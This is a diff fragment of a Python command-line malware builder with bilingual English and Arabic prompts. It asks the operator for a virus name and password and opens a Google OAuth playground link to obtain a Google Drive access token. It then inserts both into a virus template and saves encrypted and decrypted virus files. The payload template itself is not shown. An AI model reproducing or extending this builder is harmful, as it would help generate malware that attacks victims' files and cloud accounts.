+      BLUE = ("\033[34m")
+      GREN = ('\033[92m')
+      White = ("\033[97m")
+      RED = ("\033[31m")
+      LIGHTGREEN_EX = ('\033[92m')
+      encrypted_name = input("\033[31m ┌─[" + LIGHTGREEN_EX +
+                             "Please Type the" + BLUE + "~" + RED + "@" +
+                             White + "The Virus name" + RED + """]""" + White +
+                             """°or°""" + RED + """[""" + LIGHTGREEN_EX +
+                             "Enter" + RED + "(" + White + ".." + RED + ")" +
+                             White + "To Back" + RED + """]
+ └──╼ """ + White + "$ ")
+      if encrypted_name == '..':
+        os.system('clear')
+        run_random_funktion()
+        op()
+      password = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Please Type the" +
+                       BLUE + "~" + RED + "@" + White + "Password Encrypted" +
+                       RED + """]
+ └──╼ """ + White + "$ ")
+      import webbrowser
+      url = 'https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow'
+      webbrowser.open(url)
+      print(
+          RED +
+          'You Can found your Google Drive token Here👇/يمكنك العثور على رمز التوكن الخاص بحسابك على جوجل درايف هنا\n'
+      )
+      print(
+          'https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow\n'
+      )
+      nun = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Please Type the" + BLUE +
+                  "~" + RED + "@" + White + "Google Drive Code" + RED + """]
+ └──╼ """ + White + "$ ")
+      new_text = encrypted_virus.replace("abcde", nun)
+      new_text = new_text.replace("passe", password)
+      with open(encrypted_name + '.py', 'w', encoding='utf-8') as file:
+        file.write(new_text)
+
+      ###################################
+      ##############decrypted############
+      with open(encrypted_name + "_decrypted.py", "w", encoding='utf-8') as f:
+        f.write(decrypted_virus)
+      ascii()
+      print(White + 'The virus has been saved as ' + RED + encrypted_name +
+            '.py')
+      print(White + 'The virus has been saved as ' + RED + encrypted_name +
+            '_decrypted.py')
+
+      #################################
+      def restart():
+        while True:
+          import os
+          restart = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Do You Want" +
+                          BLUE + "~" + RED + "@" + White + "Back" + RED + """]
+ └──╼  """ + White + "(y/n) ? ")
+          if restart == "y":
+            import os
+            os.system('clear')
+            run()
+          #  break
+          elif restart == "n":
+            bye()
+            exit()
+          else:
+            os.system('clear')
+            print(
+                'The character you entered does not exist. Please choose :\ny\nor\nn'
+            )
+            print(
+                'الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn'
+            )
+
+      restart()
+
+  run()
 
 
-				###################################
-				##############decrypted############
-				with open(encrypted_name+"_decrypted.py", "w", encoding='utf-8') as f:
-					f.write(decrypted_virus)
-				ascii()
-				print(White+'The virus has been saved as ' +RED+ encrypted_name + '.py')
-				print(White+'The virus has been saved as ' +RED+ encrypted_name + '_decrypted.py')
-#################################
-				def restart():
-				    while True:
-				        import os
-				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
- └──╼  """+White+"(y/n) ? ")
-				        if restart == "y":
-				            import os
-				            os.system('clear')
-				            run()
-				          #  break
-				        elif restart == "n":
-				            bye()
-				            exit()
-				        else:
-				            os.system('clear')
-				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
-				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
-				restart()
-	run()
 op()
